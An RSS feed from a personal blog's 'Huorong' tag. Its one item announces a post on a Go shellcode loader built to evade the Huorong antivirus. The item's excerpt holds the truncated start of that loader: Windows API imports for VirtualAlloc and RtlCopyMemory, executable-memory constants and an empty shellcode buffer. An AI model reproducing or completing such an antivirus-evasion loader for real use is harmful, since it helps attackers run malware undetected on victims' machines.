<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Huorong on Boris&#39;s Blog</title>
    <link>https://id-none.github.io/tags/huorong/</link>
    <description>Recent content in Huorong on Boris&#39;s Blog</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 03 Jun 2024 16:22:34 +0800</lastBuildDate>
    <atom:link href="https://id-none.github.io/tags/huorong/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Go语言ShellCode免杀火绒</title>
      <link>https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</link>
      <pubDate>Mon, 03 Jun 2024 16:22:34 +0800</pubDate>
      <guid>https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</guid>
      <description>1. Shellcode 加载器（go） 我们先看最后的免杀代码 package main import ( &amp;quot;fmt&amp;quot; &amp;quot;os&amp;quot; &amp;quot;syscall&amp;quot; &amp;quot;unsafe&amp;quot; ) const ( MEM_COMMIT = 0x1000 MEM_RESERVE = 0x2000 PAGE_EXECUTE_READWRITE = 0x40 ) var ( kernel32 = syscall.NewLazyDLL(&amp;quot;kernel32.dll&amp;quot;) ntdll = syscall.NewLazyDLL(&amp;quot;ntdll.dll&amp;quot;) VirtualAlloc = kernel32.NewProc(&amp;quot;VirtualAlloc&amp;quot;) RtlCopyMemory = ntdll.NewProc(&amp;quot;RtlCopyMemory&amp;quot;) //shellcode_buf = []byte{ //} shellcode_buf = []byte{ } ) func check(e error) { if e</description>
    </item>
  </channel>
</rss>
